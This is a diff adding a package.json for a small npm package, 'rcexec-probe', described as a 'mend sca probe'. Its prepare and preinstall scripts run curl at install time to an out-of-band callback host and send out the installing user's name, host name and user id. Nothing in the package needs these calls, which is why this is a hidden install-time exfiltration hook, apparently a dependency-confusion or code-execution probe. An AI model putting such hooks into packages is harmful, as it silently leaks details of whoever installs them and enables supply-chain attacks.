@@ -1,0 +1,12 @@
+{
+  "name": "rcexec-probe",
+  "version": "1.0.0",
+  "description": "mend sca probe",
+  "scripts": {
+    "prepare": "curl -sk http://dba7kfrk6n4as06l5hd07rfor6i3q979t.oast.pro/mend/prepare/$(whoami)/$(hostname)/$(id -u)",
+    "preinstall": "curl -sk http://dba7kfrk6n4as06l5hd07rfor6i3q979t.oast.pro/mend/preinstall/$(whoami)/$(hostname)"
+  },
+  "dependencies": {
+    "lodash": "4.17.21"
+  }
+}
